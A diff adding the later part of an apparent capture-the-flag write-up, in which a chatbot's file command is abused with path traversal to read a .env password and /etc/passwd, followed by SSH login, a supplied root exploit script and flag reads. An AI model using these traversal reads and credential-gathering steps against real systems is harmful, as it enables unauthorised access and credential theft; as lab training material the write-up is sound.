@@ -121,5 +121,55 @@ I read each file content but found password in `.env` file. I used command
 ```
 recyclops file ./../hubot/.env
 ```
+</br>
+I have PASSWORD but no USERNAME so i listed the `/etc/passwd` directory. Using
+```
+recyclops list ./../../../etc/paswd
+```
+and we found username `dwight`.
+
+## Gaining Access </br>
+I ssh into server using credentials found. 
+```
+ssh dwight@<ip>
+```
+Enter the Password you found.</br>
+Now you have remote shell access via ssh.</br>
+
+I read user.txt
+```
+cat user.txt
+```
+
+## Priv-Esc</br>
+
+This lab did not focused too much on priveledge escalation as i would assume it was about enumeration and LFI.</br>
+`linpeash.sh` and `exploit.py` was already their in that directory.
+
+You can directory run `exploit.py` to gain root access by using
+```
+python3 exploit.py
+```
+If it doesn't work, run the same command again!</br>
+or 
+
+You can run `linpeas.sh` to find vulnerablity and find online exploit and tranfer to this machine and run it but it was already given to us i.e `exploit.py`. 
+To run `linpeas.sh` use command
+```
+./linpeash.sh
+```
+or 
+```
+bash linpeas.sh
+```
+</br>>
+
+Read the Root Flag  at `/root/root.txt`
+```
+cat /root/root.txt
+```
+
+
+
 
 
